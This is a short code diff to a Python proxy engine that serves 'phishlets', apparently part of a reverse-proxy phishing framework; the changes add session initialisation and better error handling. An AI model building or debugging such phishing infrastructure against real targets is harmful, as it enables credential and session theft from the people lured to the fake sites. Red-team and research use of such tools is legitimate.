@@ -254,6 +254,10 @@ class ProxyEngine:
 
     async def _handle_request(self, request: web.Request, phishlet: PhishletConfig) -> web.Response:
         """Handle an incoming request and proxy it to the target"""
+        # Ensure client session is initialized
+        if not self._client_session:
+            await self.init()
+
         session = self._get_or_create_session(phishlet.id, request)
 
         # Build target URL
@@ -417,9 +421,14 @@ class ProxyEngine:
 
                 return response
 
+        except aiohttp.ClientError as e:
+            logger.error(f"Proxy client error: {e}")
+            return web.Response(text=f"Proxy Error: Could not connect to {phishlet.target_host}: {str(e)}", status=502)
         except Exception as e:
-            logger.error(f"Proxy error: {e}")
-            return web.Response(text=f"Proxy Error: {str(e)}", status=502)
+            logger.error(f"Proxy error: {type(e).__name__}: {e}")
+            import traceback
+            traceback.print_exc()
+            return web.Response(text=f"Proxy Error: {type(e).__name__}: {str(e)}", status=502)
 
     async def start_phishlet(self, phishlet_id: str, port: int = 8443) -> Dict:
         """Start a phishlet proxy server"""
